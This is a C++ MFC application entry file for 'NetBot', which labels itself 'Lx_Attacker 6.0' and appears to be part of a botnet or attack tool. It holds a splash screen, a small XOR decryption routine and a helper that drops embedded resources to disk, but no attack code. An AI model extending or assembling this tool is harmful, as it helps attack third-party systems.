// NetBot.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "NetBot.h"
#include "NetBotDlg.h"

#include "ExClass/IniFile.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#include "SkinPPWTL.h"

/////////////////////////////////////////////////////////////////////////////
// CNetBotApp

BEGIN_MESSAGE_MAP(CNetBotApp, CWinApp)
    //{{AFX_MSG_MAP(CNetBotApp)
    // NOTE - the ClassWizard will add and remove mapping macros here.
    //    DO NOT EDIT what you see in these blocks of generated code!
    //}}AFX_MSG
    ON_COMMAND(ID_HELP, CWinApp::OnHelp)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CNetBotApp construction

CNetBotApp::CNetBotApp()
{
    // TODO: add construction code here,
    // Place all significant initialization in InitInstance
    VipID = 62;
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CNetBotApp object

CNetBotApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CNetBotApp initialization
void CNetBotApp::DecryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)
{
    unsigned long i;
    unsigned char p;

    p = (unsigned char ) key % 254 +1;

    for(i = 0; i < nLen; i++) {
        *szRec -= p;
        *szRec ^= p;
        szRec++;
    }
}

BOOL LoadSource(UINT resoure_id, const char * type, const char * filepath)
{
    //获得资源指针
    HRSRC hRsrc = ::FindResource( NULL, MAKEINTRESOURCE( resoure_id ), type );

    if( hRsrc ) {
        //获得资源大小
        DWORD size = ::SizeofResource( NULL, hRsrc );
        //将资源载入内存
        HGLOBAL  handle = ::LoadResource( NULL, hRsrc );
        //写入文件
        if( handle ) {
            //定位资源位置
            BYTE *MemPtr = (BYTE *)LockResource( handle );

            CFile file;

            if( file.Open( filepath, CFile::modeCreate | CFile::modeWrite ) ) {
                file.Write( MemPtr, size );

                file.Close( );
            }
            ::UnlockResource( handle );
        }
        ::FreeResource( handle );
        return TRUE;
    }
    return FALSE;
}

BOOL CNetBotApp::InitInstance()
{
    AfxEnableControlContainer();

    // Standard initialization
    // If you are not using these features and wish to reduce the size
    //  of your final executable, you should remove from the following
    //  the specific initialization routines you do not need.

#ifdef _AFXDLL
    Enable3dControls();			// Call this when using MFC in a shared DLL
#else
    Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif

    //提高进程优先级，防止死掉================================
    //SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

    CNetBotDlg dlg;
    m_pMainWnd = &dlg;
    /**********************************启动画面*****************************************************/

    pSplash=new CSplashScreenEx();
    pSplash->Create(m_pMainWnd,NULL,CSS_FADE | CSS_CENTERSCREEN | CSS_SHADOW);
    pSplash->SetBitmap(IDB_LOGO,255,0,255);
    pSplash->SetTextFont("MS Sans Serif",100,CSS_TEXT_NORMAL);
    pSplash->SetTextRect(CRect(20,100,250,120));//左上右下
    pSplash->SetTextColor(RGB(255,0,0));
    pSplash->SetTextFormat(DT_SINGLELINE | DT_CENTER | DT_VCENTER);
    pSplash->SetText("Lx_Attacker 6.0 Version");                  //设置文字
    pSplash->Show();

    /**********************************启动画面*****************************************************/

    AttachImageList();

    int nResponse = dlg.DoModal();
    if (nResponse == IDOK) {
        // TODO: Place code here to handle when the dialog is
        //  dismissed with OK
    } else if (nResponse == IDCANCEL) {
        // TODO: Place code here to handle when the dialog is
        //  dismissed with Cancel
    }

    // Since the dialog has been closed, return FALSE so that we exit the
    //  application, rather than start the application's message pump.
    return FALSE;
}

int CNetBotApp::ExitInstance()
{
    // TODO: Add your specialized code here and/or call the base class
    DetachImageList();
    return CWinApp::ExitInstance();
}

void CNetBotApp::AttachImageList()
{
    ////////////////////////////
    //获得指向系统大小图标的句柄
    SHFILEINFO sfi;
    HIMAGELIST hSystemImageList;

    TCHAR cWinDir[100];
    GetWindowsDirectory(cWinDir,100);

    hSystemImageList = (HIMAGELIST)SHGetFileInfo( (LPCTSTR)cWinDir,0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
    m_SmallImgList.Attach(hSystemImageList);
    hSystemImageList = (HIMAGELIST)SHGetFileInfo( (LPCTSTR)cWinDir, 0, &sfi, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_ICON);
    m_LargeImgList.Attach(hSystemImageList);
}

void CNetBotApp::DetachImageList()
{
    m_SmallImgList.Detach();
    m_LargeImgList.Detach();
}
